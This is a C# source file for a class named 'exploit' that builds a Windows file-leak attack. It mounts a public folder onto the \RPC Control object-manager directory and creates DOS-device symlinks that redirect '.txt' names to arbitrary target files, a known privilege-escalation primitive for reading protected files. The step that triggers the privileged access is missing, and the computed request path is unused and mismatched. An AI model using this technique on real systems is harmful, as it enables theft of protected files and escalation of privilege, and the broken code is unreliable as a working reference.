using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace IOAClient
{
    internal class exploit
    {
        /// <summary>
        ///  Creates a fresh directory at `directoryPath`
        ///  Erasing content if necessary
        /// </summary>
        /// <param name="directoryPath"></param>
        public static void create_fresh_directory(string directoryPath)
        {

            try
            {
                // Check if the directory exists
                if (Directory.Exists(directoryPath))
                {
                    // Delete the directory and its contents
                    Directory.Delete(directoryPath, true);
                }

                // Create the directory
                Directory.CreateDirectory(directoryPath);

                Console.WriteLine($"Directory '{directoryPath}' created successfully.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error: {ex.Message}");
            }
        }

        
    
        public static string txt_filename(string filename)
        {
            return string.Format("{0}.txt", filename);
        }


        const string RPC_CONTROL_PATH = "\\RPC Control";
        const string stage_mountpoint_path = "c:\\users\\public\\exploit";

        public static void leak_files(IEnumerable<string> file_list)
        {
            create_fresh_directory(stage_mountpoint_path);
            

            // Create Mountpoint to RPC Control
            bool res = symlink_wrapper.create_mount_point(
                                    stage_mountpoint_path, RPC_CONTROL_PATH);
            if (res == false)
            {
                Console.WriteLine("Unable to create stage mountpoint");
                return;
            }

            // Populate a list of symlinks with the target native paths
            List<(string, string)> symlinks = new List<(string, string)>();

            foreach (var filepath in file_list)
            {
                string filename = Path.GetFileName(filepath);
                string _key = string.Format("{0}\\{1}", RPC_CONTROL_PATH, txt_filename(filename));
                string _native_path = string.Format("\\??\\{0}", filepath);
                symlinks.Add((_key, _native_path));
            }

            // Create Object Manager Links and issue quest
            foreach (var (link, target) in symlinks)
            {
                // Create Object Manager link
                symlink_wrapper.create_dos_device_symlink(link, target);

                var request_path = string.Format("{0}\\{1}",
                                        stage_mountpoint_path,
                                        Path.GetFileName(target));

              

                // Remove object manager link
                symlink_wrapper.remove_dos_device_symlink(link, target);
            }


          

            Thread.Sleep(500);
            res = symlink_wrapper.delete_mount_point(stage_mountpoint_path);
            if (res == false)
            {
                Console.WriteLine("Error while deleting stage mountpoint");
            }
        }

    }


    
}
